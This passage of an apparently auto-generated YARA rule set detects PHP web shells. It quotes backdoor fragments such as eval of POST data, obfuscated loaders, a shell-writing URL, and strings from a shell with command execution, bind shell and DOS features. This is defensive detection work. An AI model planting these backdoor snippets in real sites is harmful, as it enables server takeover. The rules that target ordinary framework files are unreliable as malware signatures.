      $s19 = "def'][27].$GLOBALS['he2def'][79].$GLOBALS['he2def'][84]]($b8db730[$n6b51e23c]));" fullword ascii
      $s20 = "f'][36].$GLOBALS['he2def'][49].$GLOBALS['he2def'][87].$GLOBALS['he2def'][35];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule sig_8a34e6b06de52123d8f7ac662ed6b356cac3c493
{
   meta:
      description = "php17 - file 8a34e6b06de52123d8f7ac662ed6b356cac3c493.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d61e7b8a306aca1a93c7214777b0baf1b9f71a2ce3ae4a66db3ffa49141ed291"
   strings:
      $s1 = "){@file_put_contents($_SERVER['HTTP_X'],$_SERVER['HTTP_Y']);header(\"Location: ./\".$_SERVER['HTTP_X']);};" fullword ascii
      $s2 = "if(crypt($_SERVER['HTTP_H0ST'],51)==" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_904326c8f9a592c043685a634d33df71da36078e
{
   meta:
      description = "php17 - file 904326c8f9a592c043685a634d33df71da36078e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bdc204f85602dced3197ddde915831b87153e7bd1b53c479f80efe4db8dcb1cb"
   strings:
      $x1 = "//http://test.com/get_write.php?a=/shell.php&b=3C3F70687020406576616C28245F504F53545B2763616964616F275D293B3F3E" fullword ascii
      $s2 = "3C3F70687020406576616C28245F504F53545B2763616964616F275D293B3F3E" ascii
      $s3 = "//caidao connecting http://test.com/shell.php" fullword ascii
      $s4 = "var_dump($p,$tt);" fullword ascii
      $s5 = "$p=realpath(dirname(__FILE__).\"/\").$_GET[\"a\"];" fullword ascii
      $s6 = "for ($i=0;$i<strlen($t);$i+=2) $tt.=urldecode(\"%\".substr($t,$i,2));" fullword ascii
      $s7 = "$t=$_GET[\"b\"];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule sig_9d70da5f7b4b962424091e5f63dd46fc528c341b
{
   meta:
      description = "php17 - file 9d70da5f7b4b962424091e5f63dd46fc528c341b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "31c4c962870e17c8d724ae38e96dc3fd090b7e7e0758821f69f6cb60bad0cece"
   strings:
      $s1 = "\".substr($c,$i,2));@fwrite(fopen($f,\"w\"),$buf); echo \"1ok\";?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_598ae68d211f82459b91e12020bd4da11a2aa7fd
{
   meta:
      description = "php17 - file 598ae68d211f82459b91e12020bd4da11a2aa7fd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c8e27064f784e9dcedf5ea6ab978c018bbb2f32a5e9811dd38c45715a3f37d84"
   strings:
      $s1 = "$str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));" fullword ascii
      $s2 = "$str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));" fullword ascii
      $s3 = "(@$_=decrypt(\"xKXZyqet\",\"520025\")).@$_(decrypt(\"l6aW0YvIlpulsdSoX1yWhoKDiL1ck42WX4xilZRlZ29ZWV4=\",\"06789\"));" fullword ascii
      $s4 = "function encrypt($data, $key)" fullword ascii
      $s5 = "$str .= chr(ord($data{$i}) + (ord($char{$i})) % 256);" fullword ascii
      $s6 = "function decrypt($data, $key)" fullword ascii
      $s7 = "if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1)))" fullword ascii
      $s8 = "$char .= substr($key, $x, 1);" fullword ascii
      $s9 = "$l  = strlen($key);" fullword ascii
      $s10 = "$l = strlen($key);" fullword ascii
      $s11 = "$key = md5($key);" fullword ascii
      $s12 = "$char .= $key{$x};" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_3ccdd51fe616c08daafd601589182d38
{
   meta:
      description = "php17 - file 3ccdd51fe616c08daafd601589182d38.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f85efe19fa56ed9e9a7dfed8ea5bdc98ad286189762533d0767853ce391d6a6e"
   strings:
      $x1 = "$string361369589 = \"sys2iGpM4W6AelyNEX0NodYcjLTe9cnzBXiUpF5VcMqM5YCANk3kKntbnch5g60k0zoAG59cX9tBctNoAj1kA1FVBmebRIWnEx4D59n+GrB" ascii
      $s2 = "$mx = int32((($z >> 5 & 0x07ffffff) ^ $y << 2) + (($y >> 3 & 0x1fffffff) ^ $z << 4)) ^ int32(($sum ^ $y) + ($k[$p & 3 ^ " fullword ascii
      $s3 = "$mx = int32((($z >> 5 & 0x07ffffff) ^ $y << 2) + (($y >> 3 & 0x1fffffff) ^ $z << 4)) ^ int32(($sum ^ $y) + ($k[$p & " fullword ascii
      $s4 = "$v = unpack(\"V*\", $s. str_repeat(\"\\0\", (4 - strlen($s) % 4) & 3));" fullword ascii
      $s5 = "if (($m < $n - 3) || ($m > $n)) return false;" fullword ascii
      $s6 = "$y = $v[0] = int32($v[0] - $mx);" fullword ascii
      $s7 = "$y = $v[$p] = int32($v[$p] - $mx);" fullword ascii
      $s8 = "function xxtea_encrypt($str, $key) {" fullword ascii
      $s9 = "$sum = int32($sum - $delta);" fullword ascii
      $s10 = "zQe8WqDNKrSxQgchEpCKnGxzyBI6Vw+m9cg/3/DV70cc2exCVD4QGPozoLApinuSNVjKNvHbA34ve4X6G8cHTwBRAiDnYjJKGHEoEQL0sj9HVYI6CLzc8MDllNhWKQkp" ascii
      $s11 = "elHDgf7+RT5hmmm7RPS0Ytib9f/fte6DPEUbD/Qjne2VRISq4LBquTHiO7qu7SwpQdiUfQ9zjyJyKsyTDnjvU4lmrU6RAuRsPyqVO3wPJQj2IOf1qO5qugA4IKb2ddwX" ascii
      $s12 = "PGhEs14NL8+L0TECEydJMxF9TOGqArD75TS8mUdqxPz2Fl/f7jv9kAZQ+tQyi80jb+vxE0fPvF1TMAC+JiNFfqNpT1xw6rqDjNPwzHfwpiTYyDL8Uspy2+niDJAm9Fco" ascii
      $s13 = "9Yoy27ED/xWVAgQs7aLumqlUIrCKIRvNqU3nNu48v4X1X4x2GWyqWgxTMwrBy2ADFhMLxai78xdKwspEhOmudZv9+usPV2Sil8WwhXkqnahkOJPP+xZg9olMW4rAkRgl" ascii
      $s14 = "6+THoYpvjBNsbwl4uC8DZJNzUxrDGuxRI1BmN6RkT2lqnePPAtUd7zRTjtFsGUFdvpny+wkJ5l+xrMploG4szKAzOuPEKqELlpBuxi/3U/rg/EoYw6wkvzgzgAxqrCKi" ascii
      $s15 = "vTQsmq5dFnf7EJnfVObyxArxgu81qZnWC0sSCvHbWtyNzK3OxkSrddnJqOKZDVtEtwHpqj9jS7h4fTpUeXIueIzDfbnaI0Xy9MeenwMZdPb4S9rmd2SDyJw2vZzlf9ws" ascii
      $s16 = "PjJ3MJidiH+btaB6C4J2t4/XrutoE8RHJxZJv1FKh5mKsNuOOmA9lQ25GP7mkcvnXT7j1v/JbN4RkIKRd6du7dAlGETQC50WwDhjXOCdJ/AqWsJpTua1WfCzkPIEncRe" ascii
      $s17 = "kXIN/K3byKAzyopG3YjR12SBN/0ZFHjkKCXkHzYTkw/0ybcJSf980Tt38fuFUTbm2hJLZa34jRsfLcim8vtwoxP0cz0G4hU12hnkG4LQizic8ch4+8aVjkw7e81TyjIX" ascii
      $s18 = "fRDSoX8Xe1LUkh+oVoQnkJ14qSn6YhVvFxwrMCP8kB+hUCU0vlt+XloG5PUM8ROayrWogn+y5K6SvbF8r5TQIPf46R8pi8cGWjQ+J636S/AApP2sMTy7yRWujR+L8hnN" ascii
      $s19 = "51fL2uweTIrCE5Lst2OX6m2OheIisF6cmABvgBbQPAg4LPlTFq1tu3W6U4dLmFfAwBXWDByXIt555VuXZ88zXKm/GrRvToxlQtPHVOaqv/dgquigI4AFsJprEuR0J85S" ascii
      $s20 = "XD2FeiFtp0qR8AtxldC7c0zQkCUPiljScqsKAFcBOWr/ZUl903Kg1nRoWZ4B9H3JADyJf/52ZF2mKwj8qjkG6LYYrbSd9U7xpjjKIlYp5VnpdAMQsFiaPa0HXNiOZQXq" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_09a1dc9924fc6ade929ac850a9bd5557
{
   meta:
      description = "php17 - file 09a1dc9924fc6ade929ac850a9bd5557.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2744c98e5080d1b13a8ed04ed3538b9a247ed9432ed7e20298b947aecdb6a771"
   strings:
      $s1 = "$getpar.=$c(36).$c(95).$c(82).$c(69).$c(81).$c(85).$c(69).$c(83).$c(84);" fullword ascii
      $s2 = "$get.=chr(103).chr(101).chr(116).chr(95).chr(99);" fullword ascii
      $s3 = "$get.=chr(111).chr(110).chr(116).chr(101).chr(110);" fullword ascii
      $s4 = "$get=chr(102).chr(105).chr(108).chr(101).chr(95);" fullword ascii
      $s5 = "if($_POST['phpcodeurl']!=null&&$_POST['phpcodeurl']!=''){" fullword ascii
      $s6 = "$get.=chr(116).chr(115);" fullword ascii
      $s7 = "else if($_POST['tongji']!=null&&$_POST['tongji']!=''){" fullword ascii
      $s8 = "$undecode.=$c(95).$c(100).$c(101).$c(99).$c(111).$c(100).$c(101);" fullword ascii
      $s9 = "$tongji=$get($_POST['phpcodeurl']);" fullword ascii
      $s10 = "$undecode=$c(98).$c(97).$c(115).$c(101).$c(54).$c(52);" fullword ascii
      $s11 = "$tongji=$_POST['tongji'];" fullword ascii
      $s12 = "$unzip.=$c(102).$c(108).$c(97).$c(116).$c(101);" fullword ascii
      $s13 = "//$ecode($undecode($tongji));" fullword ascii
      $s14 = "@eval($undecode($tongji));" fullword ascii
      $s15 = "$unzip=$c(103).$c(122).$c(105).$c(110);" fullword ascii
   condition:
      uint16(0) == 0x4947 and filesize < 3KB and
      8 of them
}

rule sig_0b1bfb0bdc7e017baccd05c6af6943ea
{
   meta:
      description = "php17 - file 0b1bfb0bdc7e017baccd05c6af6943ea.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d34c650d2c231fc28827d76c48ffeca4cbdca3ddc1558aa8f7aa1ce9362183b0"
   strings:
      $s1 = "'UZD8hjS2hqJ8fqY8KQCpZDGewbGLoDGewbGewbGeH8O2HBvJgmhZN4tjtApewbGeHQpwGOClgbD8hjS2hqJ8fqY8KQGetQGe'." fullword ascii
      $s2 = "'s6Xbz2hSCFvQ+XhBSlhBvthOslXGEtrB5FfqElXK8jwFAewjQnhO5MtRA9UyQtrB5FfqElNOWptApewbGewbGewbzF7B52r4'." fullword ascii
      $s3 = "'Dl7qAFfNGetQIewj4FhI5pXm1wgbGewbGewbGewbGewj7nr4OJ7qTlXbIeHyK9EyQFgGzl7OAlrRSJrNAe0bAewj4FhI5ptApew'." fullword ascii
      $s4 = "'JgmQJvmS27IClwmzJiBgJhNTlrRuJfjCJ7FpewbGewbGewmClgbDnrRCUf2O2wGEJr852H8CJ7FslEBs9KI327BvJhISlwFCe'." fullword ascii
      $s5 = "'C'=>'p', 'B'=>'V', 'E'=>'n', 'D'=>'o', 'G'=>'g', 'F'=>'c', 'I'=>'9', 'H'=>'H', 'K'=>'1', 'J'=>'b', 'M'=>'L', 'L'=>'e', 'O'=>'l" fullword ascii
      $s6 = "=>'w', 'n'=>'a', 'q'=>'F', 'p'=>'K', 's'=>'u', 'r'=>'W', 'u'=>'j', 't'=>'T', 'w'=>'C', 'v'=>'y', 'y'=>'N', 'x'=>'8', 'z'=>'k');" fullword ascii
      $s7 = "'IvLXzG6gb4ew97eHyK9EyQFgGzlhOvlryQJi8RMwbTaXzGetQG8vxEpXm1wgbGewbGewbGewbGewbGewb'." fullword ascii
      $s8 = "'jQnhO5MtRy9rOAlUeGetQG8fKSnroEpXm1wgbGewbGewbGewbGewjvlUyKJHZGMuQG8HjDnUaT67SO9rjO'." fullword ascii
      $s9 = "'bGewbGewbGewmClgbDl7qAFfNGetQIewjOFrTOLXzGLoDGewbGewbGewbGewbGewbG2rR5l'." fullword ascii
      $s10 = "'SJrNDptApewbGewbGewmIehBAFfBClgbDFhSoUiBs9rKOpw2s8vzGetQIehlSJHyOpXm1wgbGewb'." fullword ascii
      $s11 = "'hjvZUmolrRzpw209vFAewjQnhO5MtRu9vz1wgbGewbGewbGcZDpewbGewbGewb3Mvm5lrRzJrqCJwmSJ7ZGJrqCJwGCehBP2H'." fullword ascii
      $s12 = "'K4vUhPgewPpewbGewbGewbGewbGeO4Q9uQgdoDGewbGewbGewjQJKyClfPG6Xbz2hSCFvQ+jWT8tBIelrqzlU80pbDGewbGewbGe'." fullword ascii
      $s13 = "'cJrquF7I5pwj7nr4OJ7qTlXz1wGz8wXjcjzOajByJ8hTOLBKJe7RSJrNgUXbIewj7nr4OJ7qTltApwZOIwGOIwEQpwZC72rR'." fullword ascii
      $s14 = "'fBQpw259rlOUfK3lhNEpXmxcwbSpwjQnhO5MtRBFfBtlrRzJrqCJWIo2hO3JEaCpXm1wgbGewbGewbGewbGewjvlUyKJH'." fullword ascii
      $s15 = "'9UjQ9ryDJrBs2wmSFvbz9UjQ9ryDJrBs2wzGLoDGewbGewbGewbGewmClgbD8hqQ2hqunhKOJEjJyOQG6tQG8fOsJhOslX'." fullword ascii
      $s16 = "'0QGa0AG8hzG6wmuJiBs2wGzJrqQ9fSOFKAoUXz1ewjCpvACwgbGewm1wgbGewbGewbG8hKCJgbIewjT9UjunhB5r5q2rvjCUtA'." fullword ascii
      $s17 = "'1wgbGewbGewbGewbGewbGewmIwgbGewbGewbGewbGewbGewbz9fOzBrRCFBAz9fOzUXbIeHjv2rN1wGDGewbGewbGewbG'." fullword ascii
      $s18 = "'slf4CFfGpewbGewbGewbzNWSZtNq8tWBXUQ4mtzFG6XmSFE8SLXGpewbGewbGewbGewbG8fqK2hSOJEjC9fqQlXFG6tPG'." fullword ascii
      $s19 = "'mQLXGzJhq52hBvF7IvpXmSJ7ZG9U8v9UOcnfBRUfBPnUyQFvGEFfKQFqITFfFEMwbzJhq52hBvF7IvpXzGLoDGewbGewbGe'." fullword ascii
      $s20 = "'52HeAewjQnhO5MtR0nhqvNfBQpXz1wgbGewbGewbGcXmOJHyOeHAGMvxGZUy52rKOehR3ehKKJHjC9EOQlUaGpH2OehySJg2Q'." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule sig_7ebc8701b66bff82b754d6a595f6010a
{
   meta:
      description = "php17 - file 7ebc8701b66bff82b754d6a595f6010a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "38833b23f28bb0221c3d60981223fe922bf42112f45af4519009263b41a4b563"
   strings:
      $s1 = "eval(base64_decode($_POST['n3c60b2']));?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule sig_01386bd6d8e091c2ab4c7c7de644d37b
{
   meta:
      description = "php17 - file 01386bd6d8e091c2ab4c7c7de644d37b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "05bfd5d205a17320acbc1ddac0af81ba0bf86c852ed3abc425242a42ae4f0582"
   strings:
      $x1 = "$encoded = base64_encode(gzdeflate(trim(stripslashes($_POST['code'].' '),'<?php,?>'),9)); // high Compression! :P" fullword ascii
      $x2 = "= \"lionaneesh@gmail.com\"; // Change this to your email , This email is used to deliver tracebacks about your shell" fullword ascii
      $x3 = "// exec_all , A function used to execute commands , This function will only execute if the Safe Mode is" fullword ascii
      $s4 = "--Some Garbage here --%x%S')this.value = '';\" onblur=\"if(this.value=='')this.value='%S%x--Some Garbage here --%x%S';\"/>" fullword ascii
      $s5 = "(: <a href=\"http://twitter.com/lionaneesh\">Follow Me</a> | <a href=\"http://facebook.com/lionaneesh\">Facebook</a> :) <br />" fullword ascii
      $s6 = "<input class=\"cmd\" name=\"message\" value=\"%S%x--Some Garbage here --%x%S\" onfocus=\"if(this.value == '%S%x" fullword ascii
      $s7 = "// ------------------------------------- Some header Functions (Need to be on top) ---------------------------------\\" fullword ascii
      $s8 = "$handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'" fullword ascii
      $s9 = "<input class=\"cmd\" name=\"to\" value=\"victim@domain.com,victim2@domain.com\" onfocus=\"if(this.value == 'vic" fullword ascii
      $s10 = "$output = shell_exec($command);" fullword ascii
      $s11 = "function exec_query_mysql($query,$sql_server,$sql_port,$sql_db,$sql_user,$sql_pass)" fullword ascii
      $s12 = "<form action=\"http://google.com\" method=\"GET\">" fullword ascii
      $s13 = "<th class=\"header\" colspan=\"1\" width=\"50px\">Bind Shell</th>" fullword ascii
      $s14 = "Oracle : <?php echo function_exists('ocilogon')?(\"<font color='red'>Enabled</font>\"):(\"Disabled\"); ?> <font color=\"s" fullword ascii
      $s15 = "if(!mail($_GET['to'],$_GET['subject'].$subjectPadd,$_GET['message'].$messagePadd,\"From:\".$from))" fullword ascii
      $s16 = "= \"off\"; // set this to on if u dont want your shell to be publicised in Search Engines ! (It increases the shell's Life')" fullword ascii
      $s17 = "$handle = popen($command , \"r\"); // Open the command pipe for reading" fullword ascii
      $s18 = "echo \"DOS attack against $mode://$IP:$port completed on \".date(\"h:i:s A\").\"<br />\";" fullword ascii
      $s19 = "<li><a href=\"<?php echo $self.'?injector'?>\">Mass Code Injector</a></li>" fullword ascii
      $s20 = "$result=exec_all($_GET['cmd']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_9bce6a855abd67f9c8c784dda2edff0d5012263f
{
   meta:
      description = "php17 - file 9bce6a855abd67f9c8c784dda2edff0d5012263f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b4e533dd3136aff882fbe4630f45b12e5d97770036d09a49342216bf0dfaf590"
   strings:
      $s1 = "<O>h=@eval($_POST[c]);</O>" fullword ascii
   condition:
      uint16(0) == 0x4f3c and filesize < 1KB and
      all of them
}

rule sig_2016_07_12_181155032011_create_tag_tags_table
{
   meta:
      description = "php17 - file 2016_07_12_181155032011_create_tag_tags_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "024a81a699ebf421c910fb38d5256c09ec3a40e08f948dd85afe6d68d7052649"
   strings:
      $s1 = "Schema::create('tag__tagged', function (Blueprint $table) {" fullword ascii
      $s2 = "Schema::create('tag__tags', function (Blueprint $table) {" fullword ascii
      $s3 = "$table->index(['taggable_type', 'taggable_id']);" fullword ascii
      $s4 = "Schema::drop('tag__tagged');" fullword ascii
      $s5 = "Schema::drop('tag__tags');" fullword ascii
      $s6 = "$table->integer('taggable_id')->unsigned();" fullword ascii
      $s7 = "$table->integer('tag_id')->unsigned();" fullword ascii
      $s8 = "$table->string('taggable_type');" fullword ascii
      $s9 = "use Illuminate\\Support\\Facades\\Schema;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_411f51c1e230468c1a571431da62ce95e06806fa
{
   meta:
      description = "php17 - file 411f51c1e230468c1a571431da62ce95e06806fa.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c21ec9f199532487e8c56adade85a0bd5ce5782c611fa818e17df34bb3acddef"
   strings:
      $s1 = "<?php if(md5($_GET['pass'])=='21232f297a57a5a743894a0e4a801fc3'){eval($_POST[console]);}else{die('fuck off!');}?>" fullword ascii
      $s2 = "21232f297a57a5a743894a0e4a801fc3" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ApacheDetector
{
   meta:
      description = "php17 - file ApacheDetector.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4545f8f4a5164dc262937b0b11a09ff3def99d7326034b3abbbafa9e8920b290"
   strings:
      $s1 = "* Detect using the result of the SPL apache_get_version()." fullword ascii
      $s2 = "* @see \\Concrete\\Core\\Service\\Detector\\DetectorInterface::detect()" fullword ascii
      $s3 = "* Detect from the SERVER_SOFTWARE key of the superglobal server array." fullword ascii
      $s4 = "if (($result === null || $result === '') && function_exists('apache_get_version')) {" fullword ascii
      $s5 = "$version = $this->detectFromServer($this->request->server->get('SERVER_SOFTWARE'));" fullword ascii
      $s6 = "* @param \\Concrete\\Core\\Http\\Request $request" fullword ascii
      $s7 = "if (is_string($value) && preg_match('/\\bApache\\/(\\d+(\\.\\d+)+)/i', $value, $m)) {" fullword ascii
      $s8 = "* @var \\Concrete\\Core\\Http\\Request" fullword ascii
      $s9 = "$version = $this->detectFromSPL(@apache_get_version());" fullword ascii
      $s10 = "namespace Concrete\\Core\\Service\\Detector\\HTTP;" fullword ascii
      $s11 = "if (preg_match('/\\bApache\\/(\\d+(\\.\\d+)+)/i', $value, $m)) {" fullword ascii
      $s12 = "* Detect using PHP_SAPI/php_sapi_name." fullword ascii
      $s13 = "use Concrete\\Core\\Service\\Detector\\DetectorInterface;" fullword ascii
      $s14 = "if (($result === null || $result === '') && $this->request->server->has('SERVER_SOFTWARE')) {" fullword ascii
      $s15 = "if (is_string($sapiName) && preg_match('/^apache(\\d)handler$/', $sapiName, $m)) {" fullword ascii
      $s16 = "* Detect using PHPInfo." fullword ascii
      $s17 = "use Concrete\\Core\\Http\\Request;" fullword ascii
      $s18 = "$version = $this->detectFromSapiName(PHP_SAPI);" fullword ascii
      $s19 = "private function detectFromSapiName($sapiName)" fullword ascii
      $s20 = "private function detectFromServer($value)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      8 of them
}

rule sig_01882513d5fa7c329e940dda99b12147
{
   meta:
      description = "php17 - file 01882513d5fa7c329e940dda99b12147.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a3679eb75f374afad1b58f2f600dfa18886a32eb482439da9d9750a819d4953c"
   strings:
      $s1 = "SVDVWS0Z1cEJhMmpsbU5FU3NYMW9abm81N2ZJRVVURUFhTzV5QlZnc0EwRUNXUHFaVlFrdllPeXNrQkE0" fullword ascii
      $s2 = "Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/" fullword ascii
      $s3 = "4cnU5T25nWXVhV1Irc0FxZWViQkRXbVZlRjZSOERrdlptOFpnV2UzZGdIY0xnWkczRXFGQXlIdmRJbVFF" fullword ascii
      $s4 = "SeDhJVjM0N2wyaDBTeksrZjloQUZlR3FpRHFUcUZjNG80ZlJkNlhZaGhLOGMxUWVIWHlQbDZiU3BPaDdH" fullword ascii
      $s5 = "iXDEzNyI7JHE3MzgwMjczLj0iXHg2ZiI7JGtiMzI4YzMwLj0iXDE0NiI7JHJlOGE1OWM3Lj0iXDE2MiI7" fullword ascii
      $s6 = "UeWp6ZTRWZWhvbUlzSnJnbEJFY0dJY0M5a0ZXYTlEYmpzRm0wdXZnc1NxSko5VDllMml5Sm5BcmJJSEo0" fullword ascii
      $s7 = "LZVBQWXZEZG4wUjNUcXJHd0xadnRsZ2Vya2krYVpEVTFiY092ZTZyZ1JFSnJsVm9RbWVOWDlLdjU0c0Vy" fullword ascii
      $s8 = "yVVFjRHlqVk1Qa0xjbWZJNm0xTEF2MWhWT0hWZUxIUUZlOGxGdWRBMFdYejBxVGhEdHFYeXF2d0gvWHFu" fullword ascii
      $s9 = "mZzcyRjRTYmVleFIrczVyalpjTmxYMWRzZk1XK3NjcGgvazFGVjhzQXNzZ0lsSnpBUUNVWDlNbnNZZjRB" fullword ascii
      $s10 = "iXDE0MSI7JGtiMzI4YzMwLj0iXDE3MiI7JHplMGMxYmE1Lj0iXDE1MSI7JHJlOGE1OWM3Lj0iXDE2NCI7" fullword ascii
      $s11 = "0UGVOTjNjM3N5cm4zbEQwNk9QZS9uT3VOdllYUENCSWpvb0t6ZnhpWWF2TWtKTGoyZitVVlFGQUhaTU5n" fullword ascii
      $s12 = "1c01zQU9Bd0NkdWthTjNQdllvUTA4YnhlZ2xsZ3Q0RmpYS2J0M0pRYzdTTEJZSHVmZFJFcVk1eWxIZ3Z3" fullword ascii
      $s13 = "0a1dtQUFtZGEvSktxV3E2M1gyTHNjcmE5aTdReEVlOGQwdHdKcFFHSEh5UVVEY0RiblEwV0cvaURrajdu" fullword ascii
      $s14 = "PYkZwS1IrS2JxYkFSNjZsbkNMN0F0Y2JlR0Z6cVdmcmwwZ2pkazdJZEJBclpLOG5DcUcrdWhwQWpBWjFy" fullword ascii
      $s15 = "1ZUFXU0hFbVJvdDg3RzRzQ2ZVRVdoRmZ6cHp2RXQzQStXWlpxdEp0cUl6WUtZU1haN2swVGppUTlJbDF5" fullword ascii
      $s16 = "LU0x0M05nOHpXZzZsOHcvK2liaVdIeEVZVmIrdi9lb0pQdElKbFp0cUxISmNGVVhZR0o4Q0lRbzdnZ0FU" fullword ascii
      $s17 = "FWjNRQXlDejVKS3E0b1pYOHpwRnV3WGtkajVLdHAvVXo3KytUU3VhZjBsaWpHUXQ1eFZNM01mbzlmS24z" fullword ascii
      $s18 = "vTmRpT1VhdGQ3aVB0RXU3V2JGOWpHMS95eWhGYno3a2RUZFc2TEFEcytRS3lteXNHZ09JQ1pTSitrdmsv" fullword ascii
      $s19 = "DaVk1MWY2cGc2bkdOalJlNytTSUZFakZNV3luMERiRUNOSXhuV1ZXbi9aNlNFREdQN2p4NmdVWmxPVzEz" fullword ascii
      $s20 = "6MEFzbFF2R1J2NEVtQVJOeWEwMWlabmFFbHBma094TThrMlJGd2lRQTBWOTNScmd5eWloUUZJSXBBMVE4" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 800KB and
      8 of them
}

rule AdaptableTest
{
   meta:
      description = "php17 - file AdaptableTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "89e789cdf62a3ca6cff18a3dc352ac90e6c378dda95a2546cba8ea4592fa9eaa"
   strings:
      $s1 = "* Copyright 2016, Union of RAD. All rights reserved. This source" fullword ascii
      $s2 = "* The full license text can be found in the LICENSE.txt file." fullword ascii
      $s3 = "$modified['default'] = $config['default'] + ['object' => $intermediate];" fullword ascii
      $s4 = "* code is distributed under the terms of the BSD 3-Clause License." fullword ascii
      $s5 = "$this->assertException(\"Configuration `non_existent_config` has not been defined.\", function() {" fullword ascii
      $s6 = "error_reporting(($original = error_reporting()) & ~E_USER_DEPRECATED);" fullword ascii
      $s7 = "$result = $strategy::applyStrategies('read', 'default', $transformed, $options);" fullword ascii
      $s8 = "$this->assertEmpty(MockAdaptable::config());" fullword ascii
      $s9 = "$this->assertException('/No adapter set for configuration/', function() {" fullword ascii
      $s10 = "$expected = \"Configuration `non_existent_config` has not been defined.\";" fullword ascii
      $s11 = ": the most RAD framework for PHP (http://li3.me)" fullword ascii
      $s12 = "$strategy::applyStrategies('method', 'non_existent_config', null);" fullword ascii
      $s13 = "'development' => $config, 'test' => $config, 'production' => $config" fullword ascii
      $s14 = "$this->assertInstanceOf($mockConfigurizer, $result->top());" fullword ascii
      $s15 = "public function testNonExistentStrategyConfiguration() {" fullword ascii
      $s16 = "public function testApplyStrategiesNonExistentConfiguration() {" fullword ascii
      $s17 = "public function testEnvironmentSpecificConfiguration() {" fullword ascii
      $s18 = "public function testApplySingleStrategyWithConfiguration() {" fullword ascii
      $s19 = "public function testApplyStrategiesNoConfiguredStrategies() {" fullword ascii
      $s20 = "$mockConfigurizer = 'lithium\\tests\\mocks\\storage\\cache\\strategy\\MockConfigurizer';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}


rule Allow_spec
{
   meta:
      description = "php17 - file Allow.spec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fd337384bd9ed269f0ecbf19ff5e9c9d9f6c586016c34f7c09363d354a5a7867"
   strings:
      $s1 = "allow('Kahlan\\Spec\\Fixture\\Plugin\\Pointcut\\Foo')->toReceive('::getQuery', '::newQuery', '::from')->andReturn('something');" fullword ascii
      $s2 = "allow('Kahlan\\Spec\\Fixture\\Plugin\\Monkey\\User')->toReceive('::create', 'all')->andReturn([['name' => 'bob']]);" fullword ascii
      $s3 = "allow('Kahlan\\Spec\\Fixture\\Plugin\\Pointcut\\Foo')->toReceive('::getQuery', '::newQuery', '::from')->andReturn('so" fullword ascii
      $s4 = "$this->loader->patchers()->add('monkey', new MonkeyPatcher());" fullword ascii
      $s5 = "allow('Kahlan\\Spec\\Fixture\\Plugin\\Pointcut\\Foo')->toReceive('::magic')->with('hello')->andReturn('world');" fullword ascii
      $s6 = "allow('Kahlan\\Spec\\Fixture\\Plugin\\Pointcut\\Foo')->toReceive('::magic')->with('world')->andReturn('hello');" fullword ascii
      $s7 = "allow('Kahlan\\Spec\\Fixture\\Plugin\\Pointcut\\Foo')->toReceive('::getQuery', '::newQuery', '::from')->where([" fullword ascii
      $s8 = "allow('PDO')->toReceive('prepare', 'execute')->andReturn(true);" fullword ascii
      $s9 = "$this->loader->patchers()->add('pointcut', new PointcutPatcher());" fullword ascii
      $s10 = "allow($foo)->toReceive('message')->where(['message' => ['Hello World!']])->andReturn('Good Bye!');" fullword ascii
      $s11 = "allow($foo)->toReceive('::magicHello')->andRun(function ($message) {" fullword ascii
      $s12 = "allow($foo)->toReceive('magicHello')->andRun(function ($message) {" fullword ascii
      $s13 = "allow('Kahlan\\Spec\\Fixture\\Plugin\\Pointcut\\Foo')->toReceive('::messageStatic')->andRun(function ($param) {" fullword ascii
      $s14 = "$this->loader->addPsr4('Kahlan\\Spec\\\\', 'spec');" fullword ascii
      $s15 = "allow($foo)->toReceive('message')->with('Hello World!')->andReturn('Good Bye!');" fullword ascii
      $s16 = "allow($foo)->toReceive('message')->andReturn(null, 'Hello World!', 'Good Bye!');" fullword ascii
      $s17 = "$cachePath = rtrim(sys_get_temp_dir(), DS) . DS . 'kahlan';" fullword ascii
